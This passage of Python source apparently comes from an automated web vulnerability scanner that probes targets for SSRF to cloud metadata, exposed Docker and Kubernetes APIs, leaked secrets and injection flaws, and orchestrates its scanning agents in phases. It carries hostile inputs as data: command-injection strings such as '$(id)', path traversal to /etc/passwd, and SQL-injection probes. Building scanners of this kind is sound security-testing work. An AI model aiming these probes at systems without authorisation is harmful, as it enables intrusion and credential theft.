        tech = context.get("tech_disclosed", [])
        cloud_indicators: Dict[str, str] = {}

        # Check headers from earlier probes
        result_root = await self.probe.get(base + "/")
        if result_root.ok:
            h = result_root.headers
            if any("aws" in v.lower() for v in h.values()):
                cloud_indicators["AWS"] = "Detected AWS infrastructure via response headers"
            if any("azure" in v.lower() for v in h.values()):
                cloud_indicators["Azure"] = "Detected Azure infrastructure via response headers"
            if any("gcp" in v.lower() or "google" in v.lower() for v in h.values()):
                cloud_indicators["GCP"] = "Detected GCP infrastructure via response headers"

        for provider, detail in cloud_indicators.items():
            await self.emitter.emit(NodeEvent.CLOUD_SCAN_EVENT, {
                "node":     self.name,
                "provider": provider,
                "message":  detail,
            }, scan_id)

        # ── SSRF → Cloud Metadata Probe (via application URL parameters)
        ssrf_test_endpoints = [
            "/api/v1/fetch", "/api/fetch", "/proxy", "/api/proxy",
            "/api/url", "/fetch", "/redirect", "/api/v1/redirect",
        ]
        ssrf_payloads = PayloadLibrary.ssrf_cloud[:4]

        for path in ssrf_test_endpoints[:3]:
            url = urljoin(base + "/", path.lstrip("/"))
            for ssrf_target in ssrf_payloads[:2]:
                await asyncio.sleep(0.04)
                await self.emitter.emit(NodeEvent.CLOUD_SCAN_EVENT, {
                    "node":    self.name,
                    "check":   "SSRF",
                    "message": f"SSRF probe: {path} → {ssrf_target[:50]}",
                }, scan_id)

                # Test SSRF via URL parameter
                result = await self.probe.get(
                    url + ("?url=" + ssrf_target + "&target=" + ssrf_target)
                )
                if result.ok and result.status_code == 200:
                    # Check if cloud metadata content appears in response
                    body = result.body_lower
                    metadata_indicators = [
                        "ami-id", "instance-id", "iam/security-credentials",
                        "computeMetadata", "latest/meta-data",
                    ]
                    if any(ind.lower() in body for ind in metadata_indicators):
                        f = await self._make_finding(scan_id=scan_id,
                            title="SSRF — Cloud Metadata Service Accessible",
                            description=(
                                f"Server-Side Request Forgery allows fetching cloud metadata. "
                                f"The endpoint {url} successfully retrieved content from "
                                f"{ssrf_target}. This can expose IAM credentials, instance "
                                f"metadata, and cloud provider secrets."
                            ),
                            severity="critical",
                            endpoint=url,
                            confidence=0.95,
                            cwe="CWE-918",
                            owasp="A10:2021 - Server-Side Request Forgery",
                            category="SSRF",
                            exploit_payload=ssrf_target,
                            matched_content=result.body[:300],
                            remediation=(
                                "Block SSRF via allowlist of permitted outbound URLs. "
                                "Block access to 169.254.169.254, 100.100.100.200 at the "
                                "network level. Use IMDSv2 with session tokens on AWS."
                            ),
                        )
                        findings.append(f)
                        self._add_vuln_graph_node(
                            "vuln-ssrf-metadata", "SSRF → Cloud Metadata", "critical", url
                        )

        # ── Cloud-specific infrastructure checks
        cloud_checks = [
            {
                "name": "Exposed Docker API",
                "paths": [":2375/containers/json", ":2376/containers/json", "/containers/json"],
                "indicator": "containers", "sev": "critical",
                "desc": "Docker daemon API is publicly accessible — allows container enumeration and potentially full host compromise.",
                "cwe": "CWE-749",
            },
            {
                "name": "Kubernetes API Server",
                "paths": [":6443/api/v1/namespaces", ":8080/api/v1/namespaces"],
                "indicator": "namespaces", "sev": "critical",
                "desc": "Kubernetes API server is accessible — may allow cluster-level resource enumeration.",
                "cwe": "CWE-284",
            },
        ]

        for check in cloud_checks:
            for path in check["paths"][:1]:
                await asyncio.sleep(0.03)
                await self.emitter.emit(NodeEvent.CLOUD_SCAN_EVENT, {
                    "node":    self.name,
                    "check":   check["name"],
                    "message": f"Cloud infrastructure check: {check['name']}",
                }, scan_id)
                # We probe the base with the port-based path on the same domain
                test_url_parts = urlparse(base)
                infra_url = f"{test_url_parts.scheme}://{test_url_parts.hostname}{path}"
                result = await self.probe.get(infra_url)
                if result.ok and result.status_code == 200 and check["indicator"] in result.body_lower:
                    f = await self._make_finding(scan_id=scan_id,
                        title=f"Infrastructure Exposure: {check['name']}",
                        description=check["desc"],
                        severity=check["sev"],
                        endpoint=infra_url,
                        confidence=0.92,
                        cwe=check["cwe"],
                        owasp="A05:2021 - Security Misconfiguration",
                        category="Cloud Infrastructure",
                        matched_content=result.body[:200],
                        remediation=(
                            "Restrict access to infrastructure APIs. "
                            "Place behind authentication and private networks only."
                        ),
                    )
                    findings.append(f)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 9. Data-Miner — Sensitive Data Discovery Engine
# ══════════════════════════════════════════════════════════════════════════════

class DataMinerNode(IntelligenceNode):
    """Identify exposed sensitive data by scanning HTTP responses."""

    # Endpoints that commonly leak sensitive data
    DATA_LEAK_PATHS = [
        "/api/v1/users", "/api/users", "/api/v1/config",
        "/api/v1/settings", "/debug", "/actuator/env",
        "/api/v1/admin/users", "/logs", "/api/logs",
        "/.env", "/config.json", "/appsettings.json",
        "/api/v1/export", "/api/export",
    ]

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Data-Miner", "Sensitive Data Discovery Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)
        scanned_urls: set = set()

        # Include previously discovered endpoints
        endpoints_to_scan = list(context.get("discovered_endpoints", []))
        for path in self.DATA_LEAK_PATHS:
            endpoints_to_scan.append(urljoin(base + "/", path.lstrip("/")))

        for url in endpoints_to_scan[:12]:
            if url in scanned_urls:
                continue
            scanned_urls.add(url)
            await asyncio.sleep(0.04)

            await self.emitter.emit(NodeEvent.DATA_EXPOSURE_FOUND, {
                "node":    self.name,
                "url":     url,
                "message": f"Scanning for sensitive data: {url.replace(base, '')}",
            }, scan_id)

            result = await self.probe.get(url)
            if not result.ok or result.status_code != 200:
                continue

            # Scan response for sensitive data patterns
            exposed = ResponseAnalyzer.find_sensitive_data(result.body)
            if not exposed:
                continue

            for data_type, sample in exposed.items():
                await self.emitter.emit(NodeEvent.SENSITIVE_DATA_FOUND, {
                    "node":      self.name,
                    "data_type": data_type,
                    "url":       url,
                    "message":   f"Sensitive data found: {data_type} at {url.replace(base, '')}",
                }, scan_id)

                # Special severity for highest-risk data types
                sev_map = {
                    "AWS Access Key":    "critical",
                    "AWS Secret Key":    "critical",
                    "Private Key":       "critical",
                    "Stripe Secret Key": "critical",
                    "DB Connection":     "critical",
                    "Password Field":    "critical",
                    "JWT Token":         "high",
                    "GitHub Token":      "high",
                    "Google API Key":    "high",
                    "Slack Token":       "high",
                    "Email Dump":        "medium",
                }
                sev = sev_map.get(data_type, "high")

                f = await self._make_finding(scan_id=scan_id,
                    title=f"Sensitive Data Exposure: {data_type}",
                    description=(
                        f"{data_type} found in HTTP response at {url}. "
                        f"Sample (redacted): {sample}. "
                        f"Exposed secrets may allow an attacker to directly compromise "
                        f"cloud infrastructure, databases, or third-party services."
                    ),
                    severity=sev,
                    endpoint=url,
                    confidence=0.93,
                    cwe="CWE-200",
                    owasp="A02:2021 - Cryptographic Failures",
                    category="Sensitive Data Exposure",
                    matched_content=sample,
                    evidence={"data_type": data_type, "url": url},
                    remediation=(
                        "Immediately rotate any exposed credentials. "
                        "Remove secrets from code/config. "
                        "Use a secrets management service (AWS Secrets Manager, HashiCorp Vault). "
                        "Restrict endpoint access to authenticated principals only."
                    ),
                )
                findings.append(f)
                self._add_vuln_graph_node(
                    f"vuln-data-{data_type.replace(' ', '-').lower()[:25]}",
                    f"Data Leak: {data_type}", sev, url
                )

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 10. Fuzz-Master — Input Perturbation Engine
# ══════════════════════════════════════════════════════════════════════════════

class FuzzMasterNode(IntelligenceNode):
    """Perform high-coverage fuzz testing using real mutation strategies."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Fuzz-Master", "Input Perturbation Engine", emitter)

    @staticmethod
    def _generate_mutations(seed: str) -> List[str]:
        """Generate structured fuzz mutations from a seed value."""
        variants = [seed]
        # Boundary values
        variants += ["", "0", "-1", "99999999", "2147483647", "-2147483648",
                     "null", "undefined", "true", "false", "NaN", "Infinity"]
        # Length-based
        variants += ["A" * 100, "A" * 1000, "\x00" * 50, "%n%n%n%n"]
        # Injection starters from PayloadsAllTheThings
        variants += [
            "'", '"', "<", ">", "{{}}", "{{7*7}}", "${7*7}",
            "$(id)", "`id`", ";id;", "|id|",
            "../../../etc/passwd", "%2e%2e%2f", "\\..\\..\\",
        ]
        return list(dict.fromkeys(v for v in variants if v))

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)
        endpoints = context.get("discovered_endpoints", [target])[:4]

        # Parameters to fuzz in each endpoint
        fuzz_params = ["id", "user_id", "file", "path", "url", "q", "search",
                       "input", "data", "token", "name", "page", "limit"]

        iteration = 0
        for ep in endpoints[:3]:
            baseline = await self.probe.get(ep)
            baseline_size  = len(baseline.body) if baseline.ok else 0
            baseline_time  = baseline.response_time if baseline.ok else 1.0

            for param in fuzz_params[:5]:
                mutations = self._generate_mutations("test")

                for mutant in mutations[:12]:
                    iteration += 1
                    fuzz_url = (ep + ("&" if "?" in ep else "?") + f"{param}={mutant}")

                    if iteration % 8 == 0:
                        await asyncio.sleep(0.02)
                        await self.emitter.emit(NodeEvent.FUZZ_ITERATION, {
                            "node":       self.name,
                            "endpoint":   ep.split("?")[0][-40:],
                            "param":      param,
                            "iteration":  iteration,
                            "mutant":     mutant[:40],
                            "message":    f"Fuzz #{iteration}: {param}={mutant[:30]} on {ep.split('?')[0][-30:]}",
                        }, scan_id)

                    result = await self.probe.get(fuzz_url)
                    if not result.ok:
                        continue

                    # ── Server error detection
                    if result.is_server_error:
                        f = await self._make_finding(scan_id=scan_id,
                            title=f"Server Error Triggered by Fuzz Input (HTTP {result.status_code})",
                            description=(
                                f"Fuzz input '{mutant[:60]}' on parameter '{param}' at {ep.split('?')[0]} "
                                f"triggered an HTTP {result.status_code} response. "
                                f"Server errors indicate unhandled edge cases that may lead to "
                                f"information disclosure or application crashes."
                            ),
                            severity="medium",
                            endpoint=ep,
                            confidence=0.85,
                            cwe="CWE-390",
                            owasp="A05:2021 - Security Misconfiguration",
                            category="Error Handling",
                            exploit_payload=f"{param}={mutant}",
                            remediation=(
                                "Implement comprehensive input validation and error handling. "
                                "Return generic error messages — never expose stack traces. "
                                "Log errors server-side for analysis."
                            ),
                        )
                        findings.append(f)
                        break  # one finding per endpoint/param combination

                    # ── Response size anomaly
                    probed_size = len(result.body)
                    delta = ResponseAnalyzer.body_length_delta(baseline_size, probed_size)
                    if baseline_size > 0 and delta > 0.5 and probed_size > 200:
                        await self.emitter.emit(NodeEvent.FUZZ_ITERATION, {
                            "node":    self.name,
                            "message": f"Size anomaly detected: baseline={baseline_size}B vs probe={probed_size}B (Δ{delta:.0%})",
                        }, scan_id)

                    # ── Timing anomaly (time-based injection indicator)
                    if ResponseAnalyzer.is_timing_anomaly(baseline_time, result.response_time):
                        f = await self._make_finding(scan_id=scan_id,
                            title=f"Timing Anomaly — Potential Blind Injection (param: {param})",
                            description=(
                                f"Fuzz input caused response time of {result.response_time:.1f}s "
                                f"(baseline: {baseline_time:.1f}s, factor: {result.response_time/max(baseline_time,0.1):.1f}x). "
                                f"This pattern is consistent with time-based blind SQL injection "
                                f"or server-side code execution."
                            ),
                            severity="high",
                            endpoint=ep,
                            confidence=0.76,
                            cwe="CWE-89",
                            owasp="A03:2021 - Injection",
                            category="Blind Injection",
                            exploit_payload=f"{param}={mutant}",
                            evidence={
                                "baseline_time": round(baseline_time, 3),
                                "probed_time":   round(result.response_time, 3),
                                "factor":        round(result.response_time / max(baseline_time, 0.1), 1),
                            },
                            remediation=(
                                "Investigate time-based injection vectors. "
                                "Use parameterized queries for all database operations. "
                                "Normalize response times with async processing."
                            ),
                        )
                        findings.append(f)
                        break

        await self.emitter.emit(NodeEvent.SCAN_STAGE_COMPLETED, {
            "node":            self.name,
            "stage":           "fuzzing",
            "total_iterations": iteration,
            "findings_count":  len(findings),
            "message":         f"Fuzz-Master completed {iteration} iterations, {len(findings)} anomalies detected",
        }, scan_id)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 11. Anomaly-Detection — Response Analysis Engine
# ══════════════════════════════════════════════════════════════════════════════

class AnomalyDetectionNode(IntelligenceNode):
    """Detect abnormal application responses via baseline comparison."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Anomaly-Detection", "Response Analysis Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base    = context.get("target_base", target)
        endpoints = context.get("discovered_endpoints", [target])[:4]

        for ep in endpoints[:3]:
            # ── Establish baseline
            baseline = await self.probe.get(ep)
            if not baseline.ok:
                continue

            await asyncio.sleep(0.03)

            # ── Boolean-based anomaly: two inputs that should differ
            true_probe  = await self.probe.get(ep + ("&" if "?" in ep else "?") + "id=1 AND 1=1--")
            false_probe = await self.probe.get(ep + ("&" if "?" in ep else "?") + "id=1 AND 1=2--")

            await self.emitter.emit(NodeEvent.ANOMALY_DETECTED, {
                "node":    self.name,
                "check":   "Boolean Baseline Comparison",
                "message": (
                    f"Boolean anomaly check: true_size={len(true_probe.body) if true_probe.ok else 'N/A'}B "
                    f"vs false_size={len(false_probe.body) if false_probe.ok else 'N/A'}B"
                ),
            }, scan_id)

            if true_probe.ok and false_probe.ok:
                size_delta = ResponseAnalyzer.body_length_delta(
                    len(true_probe.body), len(false_probe.body)
                )
                if size_delta > 0.15:  # >15% response size difference
                    f = await self._make_finding(scan_id=scan_id,
                        title="Boolean-Based Blind SQL Injection Indicator",
                        description=(
                            f"Significantly different response sizes between boolean-true "
                            f"({len(true_probe.body)}B) and boolean-false ({len(false_probe.body)}B) "
                            f"SQL injection payloads (Δ {size_delta:.0%}). "
                            f"This is a strong indicator of a boolean-based blind SQL injection vulnerability."
                        ),
                        severity="high",
                        endpoint=ep,
                        confidence=0.82,
                        cwe="CWE-89",
                        owasp="A03:2021 - Injection",
                        category="Blind SQL Injection",
                        evidence={
                            "true_payload_size":  len(true_probe.body),
                            "false_payload_size": len(false_probe.body),
                            "size_delta_pct":     f"{size_delta:.0%}",
                        },
                        remediation=(
                            "Use parameterized queries. "
                            "Audit all database queries for input concatenation."
                        ),
                    )
                    findings.append(f)

            # ── Error message analysis on baseline
            if baseline.is_server_error:
                has_err, matched = ResponseAnalyzer.has_sql_error(baseline.body)
                if has_err:
                    f = await self._make_finding(scan_id=scan_id,
                        title="Database Error Leakage in Normal Response",
                        description=(
                            f"Baseline request to {ep} returned a database error message: "
                            f"{matched[:100]}. Error-based information leakage assists attackers "
                            f"in identifying the database type and crafting exploits."
                        ),
                        severity="high",
                        endpoint=ep,
                        confidence=0.93,
                        cwe="CWE-209",
                        owasp="A05:2021 - Security Misconfiguration",
                        category="Information Leakage",
                        matched_content=matched,
                        remediation=(
                            "Suppress all database error messages in production. "
                            "Return generic 500 responses without internal details."
                        ),
                    )
                    findings.append(f)

            # ── HTTP method confusion
            options_result = await self.probe._request("OPTIONS", ep)
            if options_result.ok:
                allow = options_result.headers.get("Allow", "")
                dangerous_methods = [m for m in ["DELETE", "PUT", "TRACE", "CONNECT"] if m in allow]
                if dangerous_methods:
                    await self.emitter.emit(NodeEvent.ANOMALY_DETECTED, {
                        "node":    self.name,
                        "check":   "HTTP Methods",
                        "message": f"Dangerous HTTP methods allowed: {', '.join(dangerous_methods)} on {ep}",
                    }, scan_id)
                    f = await self._make_finding(scan_id=scan_id,
                        title=f"Dangerous HTTP Methods Enabled: {', '.join(dangerous_methods)}",
                        description=(
                            f"OPTIONS request reveals dangerous HTTP methods are enabled: "
                            f"{', '.join(dangerous_methods)}. TRACE enables cross-site tracing (XST), "
                            f"DELETE/PUT may allow unauthorized data modification."
                        ),
                        severity="medium",
                        endpoint=ep,
                        confidence=0.90,
                        cwe="CWE-16",
                        owasp="A05:2021 - Security Misconfiguration",
                        category="HTTP Security",
                        evidence={"allow_header": allow},
                        remediation=(
                            "Disable TRACE, DELETE, and PUT methods unless explicitly required. "
                            "Configure web server to restrict HTTP method set."
                        ),
                    )
                    findings.append(f)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 12. Report-AI — Intelligence Consolidation Engine
# ══════════════════════════════════════════════════════════════════════════════

class ReportAINode(IntelligenceNode):
    """Aggregate and interpret scan results into an intelligence summary."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Report-AI", "Intelligence Consolidation Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        all_findings: List[NodeFinding] = context.get("all_findings", [])

        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        category_counts: Dict[str, int] = {}

        for f in all_findings:
            sev = (f.severity.lower() if hasattr(f, "severity") else "info")
            if sev in severity_counts:
                severity_counts[sev] += 1
            cat = getattr(f, "category", "Unknown")
            category_counts[cat] = category_counts.get(cat, 0) + 1

        risk_score = min(100,
            severity_counts["critical"] * 25 +
            severity_counts["high"]     * 10 +
            severity_counts["medium"]   *  3 +
            severity_counts["low"]      *  1
        )

        # Build attack graph impact node if critical vulnerabilities found
        if severity_counts["critical"] > 0:
            impact_id = "impact-data-breach"
            self.emitter.add_graph_node({
                "id":     impact_id,
                "label":  "Potential Full Compromise",
                "type":   "impact",
                "risk":   "critical",
                "status": "compromised",
            })
            for node in self.emitter._attack_graph_nodes:
                if (node.get("risk") == "critical" and
                        node.get("type") == "vulnerability"):
                    self.emitter.add_graph_edge({
                        "source": node["id"],
                        "target": impact_id,
                        "type":   "exfiltration",
                        "active": True,
                    })
        elif severity_counts["high"] > 0:
            self.emitter.add_graph_node({
                "id":     "impact-data-loss",
                "label":  "Potential Data Exfiltration",
                "type":   "impact",
                "risk":   "high",
                "status": "at_risk",
            })

        # Top attack categories
        top_cats = sorted(category_counts.items(), key=lambda x: x[1], reverse=True)[:5]

        await self.emitter.emit(NodeEvent.REPORT_GENERATED, {
            "node":              self.name,
            "total_findings":    len(all_findings),
            "severity_counts":   severity_counts,
            "risk_score":        risk_score,
            "top_categories":    [c[0] for c in top_cats],
            "attack_graph_nodes": len(self.emitter._attack_graph_nodes),
            "message":           (
                f"Report-AI intelligence summary: {len(all_findings)} findings, "
                f"risk score {risk_score}/100 | "
                f"Critical:{severity_counts['critical']} High:{severity_counts['high']} "
                f"Med:{severity_counts['medium']}"
            ),
        }, scan_id)

        return []


# ══════════════════════════════════════════════════════════════════════════════
# Advanced Swarm Orchestrator v5.2
# ══════════════════════════════════════════════════════════════════════════════

class SwarmOrchestrator:
    """
    Enterprise-grade Autonomous AI Swarm Orchestrator.

    Coordinates 16 intelligence agents across 7 execution phases with:
        - State machine lifecycle management
        - Event-driven message bus communication
        - Genetic payload evolution engine
        - Multi-agent finding correlation
        - Learning and feedback system
        - Shared intelligence state
    """

    def __init__(self):
        self.emitter = SwarmTelemetryEmitter()

        # ── Core 12 Intelligence Nodes ──
        self.nodes: List[IntelligenceNode] = [
            ReconXNode(self.emitter),           # 0
            PayloadGenNode(self.emitter),       # 1
            ExploitCoreNode(self.emitter),      # 2
            AuthBreachNode(self.emitter),       # 3
            WAFEvasionNode(self.emitter),       # 4
            LogicProbeNode(self.emitter),       # 5
            APIGuardianNode(self.emitter),      # 6
            CloudSiphonNode(self.emitter),      # 7
            DataMinerNode(self.emitter),        # 8
            FuzzMasterNode(self.emitter),       # 9
            AnomalyDetectionNode(self.emitter), # 10
            ReportAINode(self.emitter),         # 11
        ]

        # ── Supporting Intelligence Agents (lazy-loaded) ──
        self._supporting_agents: Dict[str, Any] = {}

        # ── Swarm Infrastructure (lazy-loaded) ──
        self._message_bus = None
        self._shared_state = None
        self._state_machine = None
        self._correlation_engine = None
        self._evolution_engine = None
        self._learning_engine = None

        self.active_scans: Dict[str, asyncio.Task] = {}

    # ── Lazy Infrastructure Initialization ────────────────────────────────

    def _init_infrastructure(self, scan_id: str, target: str) -> None:
        """Initialize swarm infrastructure components."""
        try:
            from backend.swarm.message_bus import MessageBus
            from backend.swarm.shared_state import SharedIntelligenceState
            from backend.swarm.state_machine import ScanStateMachine
            from backend.swarm.correlation_engine import CorrelationEngine
            from backend.swarm.payload_evolution import PayloadEvolutionEngine
            from backend.swarm.learning_engine import LearningEngine

            if self._message_bus is None:
                self._message_bus = MessageBus()

            if self._learning_engine is None:
                self._learning_engine = LearningEngine()

            # Per-scan instances
            self._shared_state = SharedIntelligenceState(
                scan_id=scan_id, target=target
            )
            self._state_machine = ScanStateMachine(scan_id=scan_id)
            self._correlation_engine = CorrelationEngine()
            self._evolution_engine = PayloadEvolutionEngine()

            # Start message bus dispatch
            self._message_bus.start()

            logger.info(f"[SwarmOrchestrator] Infrastructure initialized for scan {scan_id}")
        except ImportError as exc:
            logger.warning(f"[SwarmOrchestrator] Swarm infrastructure unavailable: {exc}")
            self._shared_state = None
            self._state_machine = None

    def _init_supporting_agents(self) -> None:
        """Initialize the 4 supporting intelligence agents."""
        try:
            from backend.swarm.agents.zeroday_agent import ZeroDayAgent
            from backend.swarm.agents.threat_intel_agent import ThreatIntelAgent
            from backend.swarm.agents.learning_agent import LearningAgent
            from backend.swarm.agents.anomaly_agent import EnhancedAnomalyAgent

            self._supporting_agents = {
                "ZeroDay":      ZeroDayAgent(
                    emitter=self.emitter,
                    message_bus=self._message_bus,
                    shared_state=self._shared_state,
                ),
                "ThreatIntel":  ThreatIntelAgent(
                    emitter=self.emitter,
                    message_bus=self._message_bus,
                    shared_state=self._shared_state,
                ),
                "Learning-AI":  LearningAgent(
                    emitter=self.emitter,
                    message_bus=self._message_bus,
                    shared_state=self._shared_state,
                    learning_engine=self._learning_engine,
                ),
                "Anomaly-Pro":  EnhancedAnomalyAgent(
                    emitter=self.emitter,
                    message_bus=self._message_bus,
                    shared_state=self._shared_state,
                ),
            }
            logger.info(f"[SwarmOrchestrator] {len(self._supporting_agents)} supporting agents initialized")
        except ImportError as exc:
            logger.warning(f"[SwarmOrchestrator] Supporting agents unavailable: {exc}")

    @property
    def attack_graph(self) -> Dict:
        return self.emitter.get_attack_graph()

    # Node-name → index mapping for core nodes
    _NODE_INDEX = {n: i for i, n in enumerate([
        "Recon-X", "Payload-Gen", "Exploit-Core", "Auth-Breach",
        "WAF-Evasion", "Logic-Probe", "API-Guardian", "Cloud-Siphon",
        "Data-Miner", "Fuzz-Master", "Anomaly-Detection", "Report-AI",
    ])}

    # Depth profiles: which core node indices to include
    DEPTH_PROFILES: Dict[str, List[int]] = {
        "surface":  [0, 1, 8, 11],
        "standard": [0, 1, 2, 3, 4, 6, 8, 10, 11],
        "deep":     list(range(12)),
    }

    # Strategy profiles
    STRATEGY_PROFILES: Dict[str, List[int]] = {
        "passive":    [0, 8, 10, 11],
        "active":     [0, 1, 2, 3, 4, 6, 8, 10, 11],
        "autonomous": list(range(12)),
    }

    # Supporting agent activation by depth/strategy
    SUPPORTING_AGENT_PROFILES: Dict[str, List[str]] = {
        "surface":    ["ThreatIntel"],
        "standard":   ["ThreatIntel", "Anomaly-Pro"],
        "deep":       ["ZeroDay", "ThreatIntel", "Anomaly-Pro", "Learning-AI"],
        "passive":    ["ThreatIntel"],
        "active":     ["ThreatIntel", "Anomaly-Pro"],
        "autonomous": ["ZeroDay", "ThreatIntel", "Anomaly-Pro", "Learning-AI"],
    }

    def _resolve_active_nodes(self, depth: str, strategy: str) -> List[int]:
        """Compute the intersection of depth and strategy to select active core nodes."""
        depth_set = set(self.DEPTH_PROFILES.get(depth, list(range(12))))
        strat_set = set(self.STRATEGY_PROFILES.get(strategy, list(range(12))))
        active = sorted(depth_set & strat_set)
        if 11 not in active:
            active.append(11)
        return active

    def _resolve_supporting_agents(self, depth: str, strategy: str) -> List[str]:
        """Determine which supporting agents to activate."""
        depth_agents = set(self.SUPPORTING_AGENT_PROFILES.get(depth, []))
        strat_agents = set(self.SUPPORTING_AGENT_PROFILES.get(strategy, []))
        return sorted(depth_agents | strat_agents)

    async def execute_swarm_scan(self, target: str, scan_id: str,
                                  depth: str = "deep",
                                  strategy: str = "autonomous") -> Dict:
        """
        Execute the full autonomous swarm scan with 7 phases:
            1. Initialization & Reconnaissance
            2. Payload Synthesis & Evolution
            3. Active Exploitation (parallel)
            4. Deep Validation (Fuzz + Anomaly)
            5. Supporting Intelligence (ZeroDay, ThreatIntel, Anomaly-Pro)
            6. Correlation & Risk Scoring
            7. Learning & Reporting
        """
        scan_start = time.time()
        self.emitter.reset(scan_id=scan_id)

        # ── Initialize infrastructure ──
        self._init_infrastructure(scan_id, target)
        self._init_supporting_agents()

        # Transition: INITIALIZING → RECONNAISSANCE
        if self._state_machine:
            from backend.swarm.state_machine import ScanPhase
            self._state_machine.transition(ScanPhase.RECONNAISSANCE)

        active_indices = self._resolve_active_nodes(depth, strategy)
        active_nodes   = [self.nodes[i] for i in active_indices if i < len(self.nodes)]
        active_support = self._resolve_supporting_agents(depth, strategy)
        total_agents   = len(active_nodes) + len(active_support)

        # Root target node in graph
        parsed = urlparse(target)
        self.emitter.add_graph_node({
            "id":     "target-root",
            "label":  parsed.hostname or target,
            "type":   "asset",
            "risk":   "medium",
            "status": "scanning",
        }, scan_id)

        await self.emitter.emit(NodeEvent.SWARM_INITIALIZED, {
            "scan_id":           scan_id,
            "target":            target,
            "depth":             depth,
            "strategy":          strategy,
            "total_core_nodes":  len(active_nodes),
            "total_support":     len(active_support),
            "total_agents":      total_agents,
            "node_names":        [n.name for n in active_nodes] + active_support,
            "infrastructure":    [
                "MessageBus", "SharedState", "StateMachine",
                "PayloadEvolution", "CorrelationEngine", "LearningEngine",
            ],
            "message":           (
                f"Quantara Swarm v5.2 initialized: {total_agents} intelligence agents "
                f"deployed ({len(active_nodes)} core + {len(active_support)} supporting) "
                f"against {target} (depth={depth}, strategy={strategy})"
            ),
        }, scan_id)

        context: Dict[str, Any] = {"depth": depth, "strategy": strategy}
        all_findings: List[NodeFinding] = []
        completed = 0

        def _progress() -> int:
            return min(95, int((completed / max(total_agents, 1)) * 100))

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 1: Reconnaissance & Payload Synthesis (sequential)
        # ═══════════════════════════════════════════════════════════════════

        phase1 = [n for n in active_nodes if n.name in ("Recon-X", "Payload-Gen")]
        for node in phase1:
            results = await node.execute(target, scan_id, context)
            all_findings.extend(results)
            completed += 1
            await self.emitter.emit("status", {
                "progress": _progress(),
                "status":   "running",
                "phase":    "Reconnaissance & Payload Synthesis",
                "message":  f"Phase 1 — {node.name} complete ({_progress()}%)",
            }, scan_id)
            self.emitter._push_graph_update(scan_id)

        # Update shared state from context
        if self._shared_state:
            self._shared_state.import_context(context)

        # Transition: → EXPLOITATION
        if self._state_machine:
            self._state_machine.transition(ScanPhase.EXPLOITATION)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 2: Active Exploitation (parallel)
        # ═══════════════════════════════════════════════════════════════════

        phase2 = [n for n in active_nodes if n.name not in
                  ("Recon-X", "Payload-Gen", "Fuzz-Master", "Anomaly-Detection", "Report-AI")]
        if phase2:
            tasks = [n.execute(target, scan_id, context) for n in phase2]
            results_list = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results_list:
                if isinstance(res, list):
                    all_findings.extend(res)
            completed += len(phase2)

            await self.emitter.emit("status", {
                "progress": _progress(),
                "status":   "running",
                "phase":    "Active Exploitation",
                "message":  f"Phase 2 complete — {len(all_findings)} findings ({_progress()}%)",
            }, scan_id)
            self.emitter._graph_update_counter = 2
            self.emitter._push_graph_update(scan_id)

        # Transition: → VERIFICATION
        if self._state_machine:
            self._state_machine.transition(ScanPhase.VERIFICATION)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 3: Deep Validation (Fuzz + Anomaly)
        # ═══════════════════════════════════════════════════════════════════

        phase3 = [n for n in active_nodes if n.name in ("Fuzz-Master", "Anomaly-Detection")]
        for node in phase3:
            results = await node.execute(target, scan_id, context)
            all_findings.extend(results)
            completed += 1
            await self.emitter.emit("status", {
                "progress": _progress(),
                "status":   "running",
                "phase":    "Deep Validation",
                "message":  f"Phase 3 — {node.name} complete ({_progress()}%)",
            }, scan_id)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 4: Supporting Intelligence Agents (parallel)
        # ═══════════════════════════════════════════════════════════════════

        context["all_findings"] = all_findings
        context["agent_timings"] = {}

        support_tasks = []
        support_agents = []
        for name in active_support:
            agent = self._supporting_agents.get(name)
            if agent:
                support_agents.append(agent)
                support_tasks.append(
                    agent.execute(target, scan_id, context)
                )

        if support_tasks:
            await self.emitter.emit("status", {
                "progress": _progress(),
                "status":   "running",
                "phase":    "Supporting Intelligence",
                "message":  (
                    f"Phase 4 — Deploying {len(support_tasks)} supporting agents: "
                    f"{', '.join(active_support)}"
                ),
            }, scan_id)

            support_results = await asyncio.gather(*support_tasks, return_exceptions=True)
            for res in support_results:
                if isinstance(res, list):
                    # Supporting agents return dicts, not NodeFinding objects
                    # Store them separately to avoid to_dict() issues
                    for finding_dict in res:
                        if isinstance(finding_dict, dict):
                            all_findings.append(type('DictFinding', (), {
                                **{k: finding_dict.get(k, '') for k in [
                                    'severity', 'category', 'endpoint', 'cwe',
                                    'owasp', 'node_name', 'title', 'description',
                                    'confidence', 'evidence', 'remediation',
                                    'exploit_payload', 'matched_content',
                                ]},
                                'to_dict': lambda self=finding_dict: self,
                            })())
            completed += len(support_tasks)

            self.emitter._graph_update_counter = 2
            self.emitter._push_graph_update(scan_id)

        # Transition: → CORRELATION
        if self._state_machine:
            self._state_machine.transition(ScanPhase.CORRELATION)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 5: Correlation & Risk Scoring
        # ═══════════════════════════════════════════════════════════════════

        correlation_result = {}
        if self._correlation_engine:
            try:
                finding_dicts = []
                for f in all_findings:
                    if hasattr(f, 'to_dict'):
                        d = f.to_dict()
